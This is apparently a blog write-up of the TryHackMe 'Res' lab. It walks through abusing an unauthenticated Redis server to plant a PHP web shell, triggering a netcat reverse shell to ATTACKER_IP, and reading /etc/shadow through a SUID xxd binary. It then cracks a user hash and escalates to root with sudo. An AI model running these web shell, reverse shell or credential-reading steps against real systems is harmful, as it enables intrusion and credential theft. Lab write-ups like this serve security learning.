---
layout: post
author: Ayman ZERDA
tags: [TryHackme, Res]
---

![header](/images/header1.png)

**Link:** [Res](https://tryhackme.com/room/res)

## Description : 
Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!

--- 

## Enumeration :
let's scan the target with nmap

```bash
nmap -sC -sV -T4 -p- 10.10.239.82 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-22 09:06 EST
Nmap scan report for 10.10.239.82
Host is up (0.10s latency).
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
6379/tcp open  redis   Redis key-value store 6.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.04 seconds
```

* we got 2 open ports: 80 (apache web server) and 5279 (Redis which is a data structure storage service)
* i did some research and i found some enumeration steps for [Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
* we can connect to redis service via redis-cli without credentials

**how to install redis-tools**

```bash
sudo apt-get install redis-tools
```

## Foothold :

* To achieve RCE we need to know the web directory, by default it's /var/www/html and we can be sure if we look at the apache web server
![proof](/images/proof.png)

* Run the following commands to achieve RCE :


```bash
redis-cli -h 10.10.239.82
 
10.10.239.82:6379> config set dir /var/www/html
OK
10.10.239.82:6379> config set dbfilename shell.php
OK
10.10.239.82:6379> set test "<?php system($_GET['cmd']) ?>"
OK
10.10.239.82:6379> save
OK
10.10.239.82:6379> exit
```


**let's start a netcat listener**


```bash
# nc -lvnp 1234
```

**let's trigger the reverse shell by visiting:**

```bash
http://10.10.239.82/shell.php?cmd=nc ATTACKER_IP PORT -e /bin/bash
```

![website](/images/revshell.png)

* we are in as www-data

```bash
# nc -lvnp 1234                         
listening on [any] 1234 ...
connect to [10.18.2.136] from (UNKNOWN) [10.10.239.82] 51758
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
```

* we can upgrade the revese shell using the following commands

```bash
# python3 -c 'import pty;pty.spawn("/bin/bash")'
# export TERM=xterm
PRESS CTRL+Z
# stty raw -echo; fg
```

## Horizontal Privilege Escalation :
* We can see that there is a user called Vianka
* Let's check the files that have the SUID bit set
```bash
find / -perm -u=s -type f 2>/dev/null
``` 
![suid](/images/suid.png)

* The results show a binary xxd with the SUID bit set and the owner is root

* next step is to visit [GTFOBins](https://gtfobins.github.io/#)

![xxd](/images/xxd.png)

* We can read any file as root
* Let's read the shadow file and see if we can crack Vianka's hash

```bash
www-data@ubuntu:/home/vianka$ xxd /etc/shadow | xxd -r 
xxd /etc/shadow | xxd -r 
root:!:18507:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18506:0:99999:7:::
uuidd:*:18506:0:99999:7:::
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
```
**crack Viank's hash with john**
![hash](/images/hash.png)

* switch user to vianka and get the flag 

![user-flag](/images/user-flag.png)

## Vertical Privilege Escalation :
* Let's check sudo privileges

```bash
vianka@ubuntu:~$ sudo -l
sudo -l
[sudo] password for vianka: beautiful1

Matching Defaults entries for vianka on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL
```
* Vianka can run any commands with sudo
* All we need to do is run **sudo su**

![root-flag](/images/root-flag.png)
